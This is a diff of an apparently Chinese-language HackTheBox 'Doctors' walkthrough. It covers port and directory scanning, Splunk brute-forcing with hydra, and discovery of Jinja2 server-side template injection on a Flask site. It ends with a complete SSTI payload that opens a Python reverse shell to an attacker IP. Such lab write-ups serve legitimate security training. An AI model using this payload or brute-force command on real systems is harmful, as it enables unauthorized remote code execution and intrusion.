@@ -1,3 +1,6 @@
+
+ssh -N -D 127.0.0.1:9050 root@207.246.124.194
+
 # 服务探测
 
 开放端口
@@ -61,6 +64,55 @@ Nmap done: 1 IP address (1 host up) scanned in 52.56 seconds
 ```
 
 
+
+
+# 8089
+```
+┌──(root㉿ss)-[~]
+└─# python3 /root/dirsearch/dirsearch.py -e* -u https://10.10.10.209:8089
+
+  _|. _ _  _  _  _ _|_    v0.4.2
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 30 | Wordlist size: 15492
+
+Output File: /root/dirsearch/reports/10.10.10.209-8089/_22-05-23_04-47-55.txt
+
+Error Log: /root/dirsearch/logs/errors-22-05-23_04-47-55.log
+
+Target: https://10.10.10.209:8089/
+
+[04:47:56] Starting: 
+[04:52:30] 200 -   26B  - /robots.txt                                         
+[04:52:32] 401 -  130B  - /services/config/databases.yml                      
+[04:52:32] 401 -  130B  - /services                                           
+[04:52:32] 401 -  130B  - /services/                                          
+[04:53:02] 200 -    2KB - /v1                                                 
+[04:53:02] 200 -    2KB - /v1.0                                               
+[04:53:02] 200 -    2KB - /v2/                                                
+[04:53:02] 200 -    2KB - /v2.0                                               
+[04:53:02] 200 -    2KB - /v3/
+[04:53:02] 200 -    2KB - /v4/
+[04:53:02] 200 -    2KB - /v3                                                 
+[04:53:02] 200 -    2KB - /v1.1                                               
+[04:53:02] 200 -    2KB - /v1/
+[04:53:03] 200 -    2KB - /v2                                                 
+                                                                              
+Task Completed
+
+```
+
+
+
+8089上的Splunk服务，在谷歌上找到下面这篇文章
+```
+https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/
+```
+
+但是需要一个用户凭据，尝试过常用信息，没有成功。爆破rockyou前10万，没有爆出密码
+
+
+
 # 80
 ```
 ┌──(root㉿ss)-[~]
@@ -111,48 +163,104 @@ Target: http://10.10.10.209/
 ```
 
 
-# 8089
-```
-┌──(root㉿ss)-[~]
-└─# python3 /root/dirsearch/dirsearch.py -e* -u https://10.10.10.209:8089
+80端口看起来都是一些静态页面
 
-  _|. _ _  _  _  _ _|_    v0.4.2
- (_||| _) (/_(_|| (_| )
+早contact页面找到一个邮箱：info@doctors.htb
 
-Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 30 | Wordlist size: 15492
+把doctors.htb加入到```/etc/hosts```
 
-Output File: /root/dirsearch/reports/10.10.10.209-8089/_22-05-23_04-47-55.txt
 
-Error Log: /root/dirsearch/logs/errors-22-05-23_04-47-55.log
+打开```http://doctors.htb```跳转到一个登陆页面，这个页面之前用IP访问的时候无法访问到
 
-Target: https://10.10.10.209:8089/
 
-[04:47:56] Starting: 
-[04:52:30] 200 -   26B  - /robots.txt                                         
-[04:52:32] 401 -  130B  - /services/config/databases.yml                      
-[04:52:32] 401 -  130B  - /services                                           
-[04:52:32] 401 -  130B  - /services/                                          
-[04:53:02] 200 -    2KB - /v1                                                 
-[04:53:02] 200 -    2KB - /v1.0                                               
-[04:53:02] 200 -    2KB - /v2/                                                
-[04:53:02] 200 -    2KB - /v2.0                                               
-[04:53:02] 200 -    2KB - /v3/
-[04:53:02] 200 -    2KB - /v4/
-[04:53:02] 200 -    2KB - /v3                                                 
-[04:53:02] 200 -    2KB - /v1.1                                               
-[04:53:02] 200 -    2KB - /v1/
-[04:53:03] 200 -    2KB - /v2                                                 
-                                                                              
-Task Completed
+登陆页面可以注册，注册一个测试账号：```max@1.com : 123456```
+
+这个好像是doctors这个网站的一个内部员工留言网，可以创建账号，发帖子
+
+网页源代码有一行注释的超链接
 
 ```
-
-
-
-8089上的Splunk服务，在谷歌上找到下面这篇文章
-```
-https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/
+<a>archive still under beta testing<a class="nav-item nav-link" href="/archive">Archive</a>
 ```
 
+/archive正在测试当中，但是打开显示空白页面，查看空白页面源代码。返回的是xml
 
-hydra -l admin -p password -s 8089 -f https://10.10.10.209 https-get /services/
+
+
+# SSTI
+
+
+
+使用curl访问这个域名
+
+```
+┌──(root💀kali)-[~]
+└─# curl -v http://doctors.htb/          
+*   Trying 10.10.10.209:80...
+* Connected to doctors.htb (10.10.10.209) port 80 (#0)
+> GET / HTTP/1.1
+> Host: doctors.htb
+> User-Agent: curl/7.83.0
+> Accept: */*
+> 
+* Mark bundle as not supporting multiuse
+< HTTP/1.1 302 FOUND
+< Date: Mon, 23 May 2022 16:24:00 GMT
+< Server: Werkzeug/1.0.1 Python/3.8.2
+< Content-Type: text/html; charset=utf-8
+< Content-Length: 237
+< Location: http://doctors.htb/login?next=%2F
+< Vary: Cookie
+< Set-Cookie: session=eyJfZmxhc2hlcyI6W3siIHQiOlsiaW5mbyIsIlBsZWFzZSBsb2cgaW4gdG8gYWNjZXNzIHRoaXMgcGFnZS4iXX1dfQ.You1IA.vRcuhcqEW6Q_jcrvRuzD41Y6DAQ; HttpOnly; Path=/
+< 
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+* Connection #0 to host doctors.htb left intact
+<p>You should be redirected automatically to target URL: <a href="/login?next=%2F">/login?next=%2F</a>.  If not click the link.
+```
+
+发现这个http server其实是python
+
+我们nmap探测到的80的http server是 Apache httpd 2.4.41
+
+说明其实是两个不同的站点
+
+python网站有可能会出现服务器端模板注入
+
+
+服务器端模板注入，本质上是用户的输入被当初了代码执行
+
+[hacktrick](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
+
+> A server-side template injection occurs when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side
+
+
+如何测试？
+
+参考hacktrick里面测试的payload，我们可以分别在title和Content做测试
+
+比如：
+
+title：```{{7*7}}```
+
+Content:```${7*7}```
+
+注意提交后的回显页面没有成功显示注入，但是在```/archive```返回的xml页面里，是可以回显上面的注入的
+
+```
+<?xml version="1.0" encoding="UTF-8" ?>
+	<rss version="2.0">
+	<channel>
+ 	<title>Archive</title>
+ 	<item><title>49</title></item>
+
+			</channel>
+
+```
+
+由上可知。title里面的```7*7```被当成了python代码执行
+
+
+
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"10.10.16.4\",443)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
